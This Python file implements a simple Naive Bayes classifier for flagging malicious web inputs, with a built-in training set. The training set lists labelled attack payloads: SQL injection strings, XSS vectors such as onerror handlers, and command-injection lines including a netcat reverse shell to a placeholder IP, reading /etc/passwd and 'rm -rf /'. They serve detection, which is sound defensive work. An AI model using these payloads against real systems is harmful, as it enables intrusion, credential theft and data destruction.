
import math
import json
import os
import re
from collections import defaultdict

class NaiveBayesClassifier:
    """
    A lightweight Naive Bayes classifier for text classification.
    Designed to detect malicious payloads (SQLi, XSS, RCE) without external ML libraries.
    """
    def __init__(self):
        self.vocab = set()
        self.word_counts = {'benign': defaultdict(int), 'malicious': defaultdict(int)}
        self.class_counts = {'benign': 0, 'malicious': 0}
        self.total_docs = 0
        self.priors = {}
        self.cond_probs = {'benign': {}, 'malicious': {}}

    def tokenize(self, text):
        """
        Custom tokenizer for code/injection payloads.
        Splits on non-alphanumeric but keeps dangerous chars as tokens.
        """
        # Lowercase for normalization
        text = text.lower()
        # 1. Split by standard delimiters
        tokens = re.split(r'(\W+)', text)
        # 2. Filter empty
        tokens = [t.strip() for t in tokens if t.strip()]
        # 3. Add character bigrams for high-entropy/obfuscation detection
        # (e.g., 'un', 'ni', 'io', 'on' helps detect keywords even if split)
        if len(text) > 2:
            bigrams = [text[i:i+2] for i in range(len(text)-1)]
            tokens.extend(bigrams)
        return tokens

    def train(self, dataset):
        """
        Train the model.
        dataset: list of (text, label) tuples.
        """
        for text, label in dataset:
            if label not in self.class_counts: continue

            self.class_counts[label] += 1
            self.total_docs += 1

            tokens = self.tokenize(text)
            for token in tokens:
                self.vocab.add(token)
                self.word_counts[label][token] += 1

        self._calculate_probabilities()

    def _calculate_probabilities(self):
        """Calculate priors and conditional probabilities with Laplace smoothing."""
        # Priors
        for label in self.class_counts:
            self.priors[label] = math.log(self.class_counts[label] / self.total_docs)

        # Conditional Probs
        vocab_size = len(self.vocab)
        for label in self.class_counts:
            total_tokens_in_class = sum(self.word_counts[label].values())
            for token in self.vocab:
                # Laplace Smoothing (+1)
                count = self.word_counts[label].get(token, 0)
                prob = (count + 1) / (total_tokens_in_class + vocab_size)
                self.cond_probs[label][token] = math.log(prob)

    def predict(self, text):
        """
        Predict class for text.
        Returns: (label, confidence_score)
        """
        tokens = self.tokenize(text)
        scores = {label: self.priors[label] for label in self.class_counts}

        for token in tokens:
            if token in self.vocab:
                for label in self.class_counts:
                    scores[label] += self.cond_probs[label][token]

        # Normalize scores (Log-Sum-Exp trick approximation for simple comparison)
        # Here we just compare.
        predicted_label = max(scores, key=scores.get)

        # Calculate a pseudo-confidence (Softmax-ish)
        # This is numerically unstable with raw logs, but sufficient for simple "is it much higher?"
        # Let's just return the probability gap.
        # If Malicious score is > Benign score, it's Malicious.

        return predicted_label, scores

    def save(self, filepath):
        """Save model weights to JSON."""
        data = {
            "vocab": list(self.vocab),
            "cond_probs": self.cond_probs,
            "priors": self.priors
        }
        with open(filepath, 'w') as f:
            json.dump(data, f)

    def load(self, filepath):
        """Load model weights."""
        if not os.path.exists(filepath): return False
        with open(filepath, 'r') as f:
            data = json.load(f)
            self.vocab = set(data["vocab"])
            self.cond_probs = data["cond_probs"]
            self.priors = data["priors"]
        return True

# --- PRE-TRAINED DATASET ---
INITIAL_DATASET = [
    # BENIGN
    ("home", "benign"), ("index", "benign"), ("about us", "benign"), ("contact", "benign"),
    ("search query", "benign"), ("page=1", "benign"), ("id=45", "benign"), ("sort=asc", "benign"),
    ("user_id=123", "benign"), ("login", "benign"), ("dashboard", "benign"), ("settings", "benign"),
    ("welcome back", "benign"), ("newsletter signup", "benign"), ("product_id=99", "benign"),
    ("category=books", "benign"), ("q=python tutorial", "benign"), ("lang=en", "benign"),

    # MALICIOUS (SQLi)
    ("' OR 1=1 --", "malicious"), ("UNION SELECT 1,2,3", "malicious"), ("admin' --", "malicious"),
    ("DROP TABLE users", "malicious"), ("SELECT * FROM passwords", "malicious"),
    ("' OR 'a'='a", "malicious"), ("waitfor delay '0:0:5'", "malicious"), ("1; DROP DATABASE", "malicious"),

    # MALICIOUS (XSS)
    ("<script>alert(1)</script>", "malicious"), ("javascript:alert('xss')", "malicious"),
    ("<img src=x onerror=alert(1)>", "malicious"), ("<svg/onload=alert(1)>", "malicious"),
    ("onmouseover=prompt(1)", "malicious"),

    # MALICIOUS (RCE)
    ("; cat /etc/passwd", "malicious"), ("| nc -e /bin/sh 1.2.3.4", "malicious"),
    ("$(whoami)", "malicious"), ("&& rm -rf /", "malicious"), ("; id", "malicious"),
    ("| bash -i", "malicious"), ("`ls -la`", "malicious")
]

def get_classifier():
    """Factory to return a trained classifier."""
    clf = NaiveBayesClassifier()
    # Try to load existing, else train
    if not clf.load("ai_model.json"):
        # print("Training AI Model...")
        clf.train(INITIAL_DATASET)
        clf.save("ai_model.json")
    return clf
